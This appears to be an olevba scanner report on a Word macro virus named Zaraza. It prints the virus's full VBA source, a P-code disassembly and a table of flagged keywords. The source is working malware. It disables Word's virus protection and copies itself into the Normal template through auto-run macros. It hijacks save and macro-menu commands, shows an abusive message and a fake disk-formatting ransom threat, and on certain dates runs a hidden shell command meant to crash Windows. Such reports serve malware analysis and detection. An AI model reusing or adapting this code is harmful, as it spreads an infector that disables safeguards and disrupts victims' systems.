olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zaraza
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zaraza - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO zaraza.bas 
in file: Virus.MSWord.Zaraza - OLE stream: 'Macros/VBA/zaraza'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Version 4.2
Sub zaraza()
 On Error Resume Next
 If (Dir(Word.Application.Path + "\~.~") = "") Then
    Application.Caption = "Mikro Word"
    path_1 = Word.Application.Path + "\~42.drv"
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
       Call expo_
    Set per_1 = NormalTemplate.VBProject.VBComponents
    Set per_2 = ActiveDocument.VBProject.VBComponents
    ActiveDocument.ReadOnlyRecommended = False
        With Dialogs(wdDialogFileSummaryInfo)
          .Author = "Divine Intervention"
          .Comments = "Created by MM (c) 2002" + _
             Chr(13) + "Send message to maxvolnov@inbox.ru" + _
             Chr(13) + "Sorry    :-)"
          .Execute
        End With
    If Left(Date, 5) = "14.12" Or Left(Date, 2) = "31" Or Left(Date, 2) = "30" Then Call zavis
    If NormalTemplate.VBProject.VBComponents.Item("zaraza").Name <> "zaraza" Then NT = True
    If ActiveDocument.VBProject.VBComponents.Item("zaraza").Name <> "zaraza" Then AD = True
    If NT = True And AD = False Then Set imp_ = per_1
    If NT = False And AD = True Then Set imp_ = per_2
       imp_.import path_1
    If AD = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
 End If
End Sub

Sub expo_()
 On Error Resume Next
 ActiveDocument.VBProject.VBComponents("zaraza").Export (Word.Application.Path + "\~42.drv")
End Sub

Sub AutoOpen()
 On Error Resume Next
 Call zaraza
End Sub

Sub AutoNew()
 On Error Resume Next
 Call zaraza
End Sub

Sub AutoClose()
 On Error Resume Next
 Call zaraza
End Sub

Sub FileSaveAs()
    On Error Resume Next
    Dialogs(wdDialogFileSaveAs).Show
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

Sub FileSave()
    On Error Resume Next
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub


Sub HelpAbout()
 On Error Resume Next
 MsgBox "Fuck You " + Application.UserName + " !!!   This Version - 4.2", , Space(12) & "About  :-)"
End Sub

Sub FileTemplates()
 On Error Resume Next
 Call zaraza
 Call IR_
End Sub

Sub ToolsMacro()
 On Error Resume Next
 Call zaraza
 Call IR_
End Sub

Sub ViewVBCode()
 On Error Resume Next
 Call zaraza
 Call IR_
End Sub

Sub IR_()
 On Error Resume Next
 MsgBox "Вставь 10 гривен в дисковод А:\ , иначе форматирую диск !!!"
 ActiveWindow.Close SaveChanges:=SaveChanges
End Sub

Sub zavis()
 On Error Resume Next
 Dim visim
  ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
  visim = Shell("con\con", vbHide)
End Sub

' МаЗдАй - жЫв !

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Zaraza
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1440 bytes
' Macros/VBA/zaraza - 11010 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000C " Version 4.2"
' Line #1:
' 	FuncDefn (Sub zaraza())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld Word 
' 	MemLd Application 
' 	MemLd Path 
' 	LitStr 0x0004 "\~.~"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #4:
' 	LitStr 0x000A "Mikro Word"
' 	Ld Application 
' 	MemSt Caption 
' Line #5:
' 	Ld Word 
' 	MemLd Application 
' 	MemLd Path 
' 	LitStr 0x0008 "\~42.drv"
' 	Add 
' 	St path_1 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' 	ArgsCall (Call) expo_ 0x0000 
' Line #10:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set per_1 
' Line #11:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set per_2 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #13:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #14:
' 	LitStr 0x0013 "Divine Intervention"
' 	MemStWith Author 
' Line #15:
' 	LineCont 0x0008 05 00 0D 00 0C 00 0D 00
' 	LitStr 0x0016 "Created by MM (c) 2002"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0022 "Send message to maxvolnov@inbox.ru"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "Sorry    :-)"
' 	Add 
' 	MemStWith Comments 
' Line #16:
' 	ArgsMemCallWith Execute 0x0000 
' Line #17:
' 	EndWith 
' Line #18:
' 	Ld Date 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "14.12"
' 	Eq 
' 	Ld Date 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 "31"
' 	Eq 
' 	Or 
' 	Ld Date 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 "30"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) zavis 0x0000 
' 	EndIf 
' Line #19:
' 	LitStr 0x0006 "zaraza"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "zaraza"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NT 
' 	EndIf 
' Line #20:
' 	LitStr 0x0006 "zaraza"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "zaraza"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St AD 
' 	EndIf 
' Line #21:
' 	Ld NT 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld AD 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld per_1 
' 	Set imp_ 
' 	EndIf 
' Line #22:
' 	Ld NT 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld AD 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld per_2 
' 	Set imp_ 
' 	EndIf 
' Line #23:
' 	Ld path_1 
' 	Ld imp_ 
' 	ArgsMemCall import 0x0001 
' Line #24:
' 	Ld AD 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' 	EndIf 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	EndSub 
' Line #27:
' Line #28:
' 	FuncDefn (Sub expo_())
' Line #29:
' 	OnError (Resume Next) 
' Line #30:
' 	Ld Word 
' 	MemLd Application 
' 	MemLd Path 
' 	LitStr 0x0008 "\~42.drv"
' 	Add 
' 	Paren 
' 	LitStr 0x0006 "zaraza"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #31:
' 	EndSub 
' Line #32:
' Line #33:
' 	FuncDefn (Sub AutoOpen())
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' 	ArgsCall (Call) zaraza 0x0000 
' Line #36:
' 	EndSub 
' Line #37:
' Line #38:
' 	FuncDefn (Sub AutoNew())
' Line #39:
' 	OnError (Resume Next) 
' Line #40:
' 	ArgsCall (Call) zaraza 0x0000 
' Line #41:
' 	EndSub 
' Line #42:
' Line #43:
' 	FuncDefn (Sub AutoClose())
' Line #44:
' 	OnError (Resume Next) 
' Line #45:
' 	ArgsCall (Call) zaraza 0x0000 
' Line #46:
' 	EndSub 
' Line #47:
' Line #48:
' 	FuncDefn (Sub FileSaveAs())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #51:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #52:
' 	EndSub 
' Line #53:
' Line #54:
' 	FuncDefn (Sub FileSave())
' Line #55:
' 	OnError (Resume Next) 
' Line #56:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #57:
' 	EndSub 
' Line #58:
' Line #59:
' Line #60:
' 	FuncDefn (Sub HelpAbout())
' Line #61:
' 	OnError (Resume Next) 
' Line #62:
' 	LitStr 0x0009 "Fuck You "
' 	Ld Application 
' 	MemLd UserName 
' 	Add 
' 	LitStr 0x0019 " !!!   This Version - 4.2"
' 	Add 
' 	ParamOmitted 
' 	LitDI2 0x000C 
' 	ArgsLd Space 0x0001 
' 	LitStr 0x000A "About  :-)"
' 	Concat 
' 	ArgsCall MsgBox 0x0003 
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Sub FileTemplates())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	ArgsCall (Call) zaraza 0x0000 
' Line #68:
' 	ArgsCall (Call) IR_ 0x0000 
' Line #69:
' 	EndSub 
' Line #70:
' Line #71:
' 	FuncDefn (Sub ToolsMacro())
' Line #72:
' 	OnError (Resume Next) 
' Line #73:
' 	ArgsCall (Call) zaraza 0x0000 
' Line #74:
' 	ArgsCall (Call) IR_ 0x0000 
' Line #75:
' 	EndSub 
' Line #76:
' Line #77:
' 	FuncDefn (Sub ViewVBCode())
' Line #78:
' 	OnError (Resume Next) 
' Line #79:
' 	ArgsCall (Call) zaraza 0x0000 
' Line #80:
' 	ArgsCall (Call) IR_ 0x0000 
' Line #81:
' 	EndSub 
' Line #82:
' Line #83:
' 	FuncDefn (Sub IR_())
' Line #84:
' 	OnError (Resume Next) 
' Line #85:
' 	LitStr 0x003B "Вставь 10 гривен в дисковод А:\ , иначе форматирую диск !!!"
' 	ArgsCall MsgBox 0x0001 
' Line #86:
' 	Ld SaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld ActiveWindow 
' 	ArgsMemCall Close 0x0001 
' Line #87:
' 	EndSub 
' Line #88:
' Line #89:
' 	FuncDefn (Sub zavis())
' Line #90:
' 	OnError (Resume Next) 
' Line #91:
' 	Dim 
' 	VarDefn visim
' Line #92:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #93:
' 	LitStr 0x0007 "con\con"
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St visim 
' Line #94:
' 	EndSub 
' Line #95:
' Line #96:
' 	QuoteRem 0x0000 0x000F " МаЗдАй - жЫв !"
' Line #97:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

